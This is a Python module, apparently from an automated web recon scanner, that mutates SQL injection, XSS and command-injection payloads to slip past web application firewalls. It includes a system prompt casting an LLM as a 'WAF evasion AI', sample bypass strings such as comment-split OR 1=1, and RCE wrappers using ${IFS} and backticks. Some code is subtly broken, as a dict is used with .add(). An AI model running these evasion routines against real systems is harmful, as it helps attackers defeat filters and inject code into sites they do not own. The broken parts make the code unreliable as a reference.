"""
ai/payload_mutation.py - Payload Mutation Engine
Transforms and mutates payloads to increase detection coverage
"""

import re
import logging
import base64
import urllib.parse
from typing import List, Dict 

logger = logging.getLogger("recon.payload_mutation")

# ─── SYSTEM PROMPT FOR WAF EVASION ──────────────────────────────────────────
_WAF_EVASION_SYSTEM = """You are a WAF evasion AI.

Mutate the payload to bypass filters.

Use techniques:

- case variation
- encoding
- comment insertion
- keyword splitting
- URL encoding

Return mutated payloads in JSON format.

Example:

{
 "mutations": [
   "'/**/OR/**/1=1--",
   "%27%20OR%201%3D1--",
   "' OR 1=1#"
 ]
}

FOCUS on realistic bypass techniques that would evade common WAF rules."""


class PayloadMutator:
    """
    Mutates payloads through various transformations:
    - Encoding variations
    - Syntax mutations
    - Delimiter changes
    - Obfuscation techniques
    
    Includes deduplication and mutation budget controls to prevent
    excessive scanning of similar endpoints.
    """

    # ─── MUTATION BUDGET CONFIGURATION ──────────────────────────────────────────
    # Limits mutations per endpoint type to prevent Groq 429 errors
    MAX_MUTATIONS_PER_ENDPOINT = {
        'oembed': 3,           # oEmbed endpoints - minimal mutations
        'wp_json': 5,          # WordPress JSON API - limited
        'generic_api': 8,      # Generic APIs - moderate
        'default': 15,         # Default for high-value endpoints
    }
    
    # Endpoint type patterns for budget classification
    ENDPOINT_PATTERNS = {
        'oembed': ['/oembed/', '/wp-json/oembed/', '/embed/', 'oembed.php'],
        'wp_json': ['/wp-json/', '/wp-api/'],
        'generic_api': ['/api/', '/rest/', '/graphql'],
    }

    def __init__(self, groq_client=None):
        self.groq = groq_client
        # Mutation tracking for deduplication
        self._mutation_cache = {}  # canonical_payload -> set of mutations
        self._endpoint_mutation_count = {}  # endpoint_type -> count
        self.encodings = [
            self._base64_encode,
            self._url_encode,
            self._double_url_encode,
            self._html_encode,
            self._unicode_escape,
            self._hex_encode
        ]

        self.mutations = [
            self._case_variation,
            self._add_comments,
            self._change_delimiters,
            self._add_noise,
            self._split_payload
        ]

        self.waf_bypass = [
            self._waf_case_mixing,
            self._waf_add_spaces,
            self._waf_replace_keywords,
            self._random_case,
            self._keyword_split,
            self._comment_injection
        ]

    def mutate_payloads(self, payloads: List[str]) -> List[str]:
        """Generate mutated versions of input payloads"""
        mutated = []

        for payload in payloads:
            # Apply various mutations
            mutated.extend(self._apply_encodings(payload))
            mutated.extend(self._apply_mutations(payload))
            mutated.extend(self._apply_waf_bypass(payload))
            mutated.extend(self._combine_transformations(payload))

        # Remove duplicates and original payloads
        mutated = list(set(mutated))
        mutated = [p for p in mutated if p not in payloads]

        # Limit total mutations to 30 to avoid excessive scanning
        if len(mutated) > 30:
            import random
            mutated = random.sample(mutated, 30)

        logger.info(f"[MUTATION] Generated {len(mutated)} mutated payloads from {len(payloads)} originals")
        return mutated

    def mutate_payloads_with_ai(self, payloads: List[str]) -> List[str]:
        """
        Mutate payloads using AI/Groq for advanced WAF evasion techniques.
        Falls back to standard mutation if AI not available.
        """
        if not self.groq:
            return self.mutate_payloads(payloads)

        try:
            import json
            payload_list_str = json.dumps(payloads[:5], indent=2)  # Top 5 payloads
            
            prompt = f"""Generate 10 advanced WAF evasion mutations for these payloads:

{payload_list_str}

Focus on:
- Case variations (case_mix, case_invert)
- Encoding bypass (double URL, HTML entities)
- Comment injection (/**/ style comments, SQL comments)
- Keyword splitting and obfuscation
- Unicode and hex encoding

Return JSON with list of mutated payloads ready for injection."""

            response = self.groq.generate(
                prompt=prompt,
                system=_WAF_EVASION_SYSTEM,
                temperature=0.3,
                max_tokens=2000,
            )

            try:
                result = json.loads(response)
                mutations = result.get('mutations', []) if isinstance(result, dict) else result
                
                if isinstance(mutations, list):
                    # Deduplicate with original payloads
                    unique_mutations = [m for m in mutations if m not in payloads]
                    logger.info(f"[MUTATION] AI generated {len(unique_mutations)} WAF evasion payloads")
                    return unique_mutations[:15]  # Limit to 15
            except (json.JSONDecodeError, ValueError):
                logger.debug(f"[MUTATION] Failed to parse AI mutations, falling back")
        except Exception as e:
            logger.debug(f"[MUTATION] AI mutation failed: {e}, using standard mutation")

        # Fallback to standard mutation
        return self.mutate_payloads(payloads)

    def _apply_encodings(self, payload: str) -> List[str]:
        """Apply various encoding transformations"""
        encoded = []
        for encoding_func in self.encodings:
            try:
                encoded_payload = encoding_func(payload)
                if encoded_payload != payload:
                    encoded.append(encoded_payload)
            except Exception as e:
                logger.debug(f"Encoding failed: {e}")
        return encoded

    def _apply_mutations(self, payload: str) -> List[str]:
        """Apply various mutation transformations"""
        mutated = []
        for mutation_func in self.mutations:
            try:
                mutated_payloads = mutation_func(payload)
                mutated.extend(mutated_payloads)
            except Exception as e:
                logger.debug(f"Mutation failed: {e}")
        return mutated

    def _apply_waf_bypass(self, payload: str) -> List[str]:
        """Apply WAF bypass transformations"""
        bypassed = []
        for bypass_func in self.waf_bypass:
            try:
                bypassed_payloads = bypass_func(payload)
                bypassed.extend(bypassed_payloads)
            except Exception as e:
                logger.debug(f"WAF bypass failed: {e}")
        return bypassed

    def _combine_transformations(self, payload: str) -> List[str]:
        """Combine multiple transformations"""
        combined = []

        # Double encoding
        try:
            double_encoded = self._url_encode(self._base64_encode(payload))
            combined.append(double_encoded)
        except Exception:
            pass

        # Encoded + mutated
        try:
            encoded = self._base64_encode(payload)
            mutated = self._add_comments(encoded)
            combined.extend(mutated)
        except Exception:
            pass

        return combined

    # Encoding methods
    def _base64_encode(self, payload: str) -> str:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return ""
        
        """Base64 encode the payload"""
        return base64.b64encode(payload.encode()).decode()

    def _url_encode(self, payload: str) -> str:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return ""
        
        """URL encode the payload"""
        return urllib.parse.quote(payload)

    def _double_url_encode(self, payload: str) -> str:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return ""
        
        """Double URL encode the payload"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _html_encode(self, payload: str) -> str:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return ""
        
        """HTML encode special characters"""
        return (payload.replace('&', '&amp;')
                      .replace('<', '&lt;')
                      .replace('>', '&gt;')
                      .replace('"', '&quot;')
                      .replace("'", '&#x27;'))

    def _unicode_escape(self, payload: str) -> str:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return ""
        
        # Ensure we iterate over characters, not substrings
        try:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        except TypeError as e:
            logger.warning(f"Unicode escape failed: {e}")
            return ""

    def _hex_encode(self, payload: str) -> str:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return ""
        
        """Hex encode the payload"""
        try:
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        except TypeError as e:
            logger.warning(f"Hex encode failed: {e}")
            return ""

    # Mutation methods
    def _case_variation(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Generate case variations"""
        variations = []
        variations.append(payload.upper())
        variations.append(payload.lower())

        # Systematic case mixing for keywords
        keywords = ['union', 'select', 'script', 'alert', 'eval', 'exec', 'system']
        for keyword in keywords:
            if keyword in payload.lower():
                # Alternate case for this keyword
                mixed = payload
                for match in re.finditer(keyword, mixed, re.IGNORECASE):
                    # Alternate upper/lower
                    replacement = ''.join(
                        c.upper() if i % 2 == 0 else c.lower()
                        for i, c in enumerate(match.group())
                    )
                    mixed = mixed[:match.start()] + replacement + mixed[match.end():]
                variations.append(mixed)

        return variations

    def _add_comments(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Add comments to obfuscate payload"""
        variations = []

        # SQL comments
        if 'select' in payload.lower() or 'union' in payload.lower():
            variations.append(payload.replace(' ', '/**/'))
            variations.append(re.sub(r'\s+', '/**/', payload))

        # JavaScript comments
        if '<script' in payload.lower():
            variations.append(payload.replace(' ', '/* */'))

        return variations

    def _change_delimiters(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Change delimiters in the payload"""
        variations = []

        # For SQL injection
        if "'" in payload:
            variations.append(payload.replace("'", '"'))
            variations.append(payload.replace("'", "`"))

        # For XSS
        if '"' in payload:
            variations.append(payload.replace('"', "'"))
            variations.append(payload.replace('"', "`"))

        return variations

    def _add_noise(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Add noise characters to evade detection"""
        variations = []

        # Add systematic whitespace
        noisy = re.sub(r'\s+', '  ', payload)  # Double spaces
        variations.append(noisy)

        # Add tabs
        noisy_tab = re.sub(r'\s+', '\t', payload)
        variations.append(noisy_tab)

        return variations

    def _split_payload(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Split payload into parts (for concatenation)"""
        variations = []

        # For SQL injection
        if 'union' in payload.lower():
            parts = payload.split('union', 1)
            if len(parts) == 2:
                variations.append(f"{parts[0]}' UNION{parts[1]}")

        # For command injection
        if '|' in payload or ';' in payload:
            variations.append(payload.replace('|', '${IFS}|'))
            variations.append(payload.replace(';', '${IFS};'))

        return variations

    def mutate_for_vuln_type(self, payloads: List[str], vuln_type: str) -> List[str]:
        """Apply type-specific mutations"""
        if vuln_type.lower() == 'sqli':
            return self._mutate_for_sqli(payloads)
        elif vuln_type.lower() == 'xss':
            return self._mutate_for_xss(payloads)
        elif vuln_type.lower() == 'rce':
            return self._mutate_for_rce(payloads)
        else:
            return self.mutate_payloads(payloads)

    def _mutate_for_sqli(self, payloads: List[str]) -> List[str]:
        # Auto-fix: type checking for list input
        if not isinstance(payloads, list):
            return []
        
        """SQL injection specific mutations"""
        mutated = []
        for payload in payloads:
            # Add SQL-specific mutations
            mutated.append(payload.replace(' ', '/**/'))
            mutated.append(payload.replace(' ', '+'))
            mutated.append(f"1{payload}--")
            mutated.append(f"0{payload}#")
        return mutated + self.mutate_payloads(payloads)

    def _mutate_for_xss(self, payloads: List[str]) -> List[str]:
        # Auto-fix: type checking for list input
        if not isinstance(payloads, list):
            return []
        
        """XSS specific mutations"""
        mutated = []
        for payload in payloads:
            # Add XSS-specific mutations
            mutated.append(payload.replace('<', '%3C'))
            mutated.append(payload.replace('>', '%3E'))
            mutated.append(f"<script>{payload}</script>")
            mutated.append(f"javascript:{payload}")
        return mutated + self.mutate_payloads(payloads)

    def _mutate_for_rce(self, payloads: List[str]) -> List[str]:
        # Auto-fix: type checking for list input
        if not isinstance(payloads, list):
            return []
        
        """RCE specific mutations"""
        mutated = []
        for payload in payloads:
            # Add RCE-specific mutations
            mutated.append(f"$({payload})")
            mutated.append(f"`{payload}`")
            mutated.append(f"|{payload}")
            mutated.append(f";{payload};")
        return mutated + self.mutate_payloads(payloads)

    def _waf_case_mixing(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Apply case mixing for WAF bypass"""
        variations = []
        # Convert to mixed case
        mixed = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        variations.append(mixed)
        return variations

    def _waf_add_spaces(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Add spaces between characters for WAF bypass"""
        variations = []
        spaced = ' '.join(payload)
        variations.append(spaced)
        return variations

    def _waf_replace_keywords(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        variations = []
        replacements = {
            'UNION': '/**/UNION/**/',
            'SELECT': 'SE/**/LECT',
            'SCRIPT': 'SCR/**/IPT',
            'ALERT': 'AL/**/ERT'
        }

        for k, v in replacements.items():
            variations.append(re.sub(rf'\b{k}\b', v, payload, flags=re.IGNORECASE))

        return variations

    def _random_case(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Random case variation for WAF bypass"""
        import random
        variations = []
        random_cased = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
        variations.append(random_cased)
        return variations



    def _keyword_split(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        variations = []
        keywords = ['UNION', 'SELECT', 'SCRIPT', 'ALERT', 'EVAL']

        for keyword in keywords:
            pattern = re.compile(keyword, re.IGNORECASE)
            if pattern.search(payload):
                split = keyword[:2] + '/**/' + keyword[2:]
                variations.append(pattern.sub(split, payload))

        return variations

    def _comment_injection(self, payload: str) -> List[str]:
        if not isinstance(payload, str):
            if isinstance(payload, dict):
                payload = str(payload)
            else:
                return []
        """Inject comments into payload for WAF bypass"""
        variations = []
        # Inject /**/ between characters
        commented = '/**/'.join(payload)
        variations.append(commented)
        # Replace 'script' with 'scr\x69pt'
        variations.append(payload.replace('script', 'scr\x69pt'))
        # Replace 'union' with 'uni\x6fn'
        variations.append(payload.replace('union', 'uni\x6fn'))
        return variations

    # ─── MUTATION BUDGET AND DEDUPLICATION METHODS ──────────────────────────────

    def _classify_endpoint_type(self, url: str) -> str:
        """Classify endpoint type for mutation budgeting."""
        url_lower = url.lower()
        for endpoint_type, patterns in self.ENDPOINT_PATTERNS.items():
            if any(pattern in url_lower for pattern in patterns):
                return endpoint_type
        return 'default'

    def _canonicalize_payload(self, payload: str) -> str:
        """
        Create a canonical form of payload for deduplication.
        Normalizes encoding and whitespace variations.
        """
        # URL decode
        canonical = payload
        try:
            canonical = urllib.parse.unquote(canonical)
        except Exception:
            pass
        
        # Normalize whitespace
        canonical = re.sub(r'\s+', ' ', canonical).strip()
        
        # Normalize case for comparison
        canonical = canonical.lower()
        
        # Remove common obfuscation patterns for comparison
        canonical = canonical.replace('/**/', ' ')
        canonical = canonical.replace('  ', ' ')
        
        return canonical

    def _is_duplicate_mutation(self, payload: str) -> bool:
        """Check if this mutation is a duplicate of an existing one."""
        canonical = self._canonicalize_payload(payload)
        
        if canonical in self._mutation_cache:
            return True
        
        # Also check for near-duplicates (90%+ similarity)
        for existing in self._mutation_cache:
            if len(canonical) > 5 and len(existing) > 5:
                # Simple similarity check
                common = sum(1 for a, b in zip(canonical, existing) if a == b)
                max_len = max(len(canonical), len(existing))
                if max_len > 0 and common / max_len > 0.9:
                    return True
        
        return False

    def _track_mutation(self, payload: str):
        """Track a mutation for deduplication."""
        canonical = self._canonicalize_payload(payload)
        self._mutation_cache.add(canonical)

    def _exceeded_mutation_budget(self, endpoint_type: str) -> bool:
        """Check if mutation budget exceeded for endpoint type."""
        current_count = self._endpoint_mutation_count.get(endpoint_type, 0)
        max_allowed = self.MAX_MUTATIONS_PER_ENDPOINT.get(endpoint_type, self.MAX_MUTATIONS_PER_ENDPOINT['default'])
        return current_count >= max_allowed

    def _increment_mutation_count(self, endpoint_type: str, count: int = 1):
        """Increment mutation count for endpoint type."""
        self._endpoint_mutation_count[endpoint_type] = \
            self._endpoint_mutation_count.get(endpoint_type, 0) + count

    def mutate_payloads_for_endpoint(self, payloads: List[str], endpoint_url: str, 
                                      endpoint_reliability: float = 1.0) -> List[str]:
        """
        Generate mutations with budget control for specific endpoint.
        
        FIX #6: Now respects endpoint reliability - reduces or skips mutations
        for endpoints that have timeout history or low reliability scores.
        
        This is the main entry point for endpoint-aware mutation.
        It respects mutation budgets based on endpoint type and
        performs deduplication to avoid redundant scanning.
        
        Args:
            payloads: Original payloads to mutate
            endpoint_url: Target endpoint URL for budget classification
            endpoint_reliability: Reliability score (0.0-1.0) based on timeout history.
                                1.0 = no issues, 0.0 = consistently timing out
            
        Returns:
            List of mutated payloads within budget limits
        """
        # FIX #6: Check endpoint reliability before generating mutations
        if endpoint_reliability < 0.3:
            logger.debug(f"[MUTATION] Skipping mutations for unreliable endpoint: {endpoint_url[:80]} "
                        f"(reliability: {endpoint_reliability:.2f})")
            return []  # Skip mutations for very unreliable endpoints
        
        endpoint_type = self._classify_endpoint_type(endpoint_url)
        
        # Check if budget exceeded for this endpoint type
        if self._exceeded_mutation_budget(endpoint_type):
            logger.debug(f"[MUTATION] Budget exceeded for {endpoint_type} endpoint: {endpoint_url[:80]}")
            return []  # Return empty - no more mutations allowed
        
        # FIX #6: Reduce mutation count based on reliability
        max_mutations = self.MAX_MUTATIONS_PER_ENDPOINT.get(
            endpoint_type, 
            self.MAX_MUTATIONS_PER_ENDPOINT['default']
        )
        
        # Scale down mutations for less reliable endpoints
        if endpoint_reliability < 1.0:
            adjusted_max = max(1, int(max_mutations * endpoint_reliability))
            logger.debug(f"[MUTATION] Adjusting mutation budget for {endpoint_url[:80]}: "
                        f"{max_mutations} -> {adjusted_max} (reliability: {endpoint_reliability:.2f})")
            max_mutations = adjusted_max
        
        # Generate mutations
        mutated = []
        for payload in payloads:
            # Skip if this payload type is already well-covered
            canonical = self._canonicalize_payload(payload)
            if canonical in self._mutation_cache:
                continue
                
            # Apply mutations
            new_mutations = []
            new_mutations.extend(self._apply_encodings(payload))
            new_mutations.extend(self._apply_mutations(payload))
            new_mutations.extend(self._apply_waf_bypass(payload))
            
            # Filter duplicates and add to results
            for m in new_mutations:
                if not self._is_duplicate_mutation(m):
                    mutated.append(m)
                    self._track_mutation(m)
            
            # Check budget after each payload
            if len(mutated) >= max_mutations:
                break
        
        # Remove duplicates and originals
        mutated = list(set(mutated))
        mutated = [p for p in mutated if p not in payloads]
        
        # Apply strict budget limit
        if len(mutated) > max_mutations:
            # Prioritize most different mutations
            mutated = mutated[:max_mutations]
        
        # Update mutation count
        self._increment_mutation_count(endpoint_type, len(mutated))
        
        logger.info(f"[MUTATION] Generated {len(mutated)} mutations for {endpoint_type} endpoint "
                   f"(budget: {max_mutations}, used: {self._endpoint_mutation_count.get(endpoint_type, 0)}, "
                   f"reliability: {endpoint_reliability:.2f})")
        
        return mutated

    def reset_budget(self, endpoint_type: str = None):
        """
        Reset mutation budget for endpoint type or all types.
        Useful for starting fresh scanning sessions.
        """
        if endpoint_type:
            self._endpoint_mutation_count[endpoint_type] = 0
        else:
            self._endpoint_mutation_count.clear()
            self._mutation_cache.clear()

    def get_budget_status(self) -> Dict[str, Dict[str, int]]:
        """Get current mutation budget status for all endpoint types."""
        status = {}
        for endpoint_type, max_allowed in self.MAX_MUTATIONS_PER_ENDPOINT.items():
            used = self._endpoint_mutation_count.get(endpoint_type, 0)
            status[endpoint_type] = {
                'used': used,
                'max': max_allowed,
                'remaining': max(0, max_allowed - used),
                'exhausted': used >= max_allowed
            }
        return status
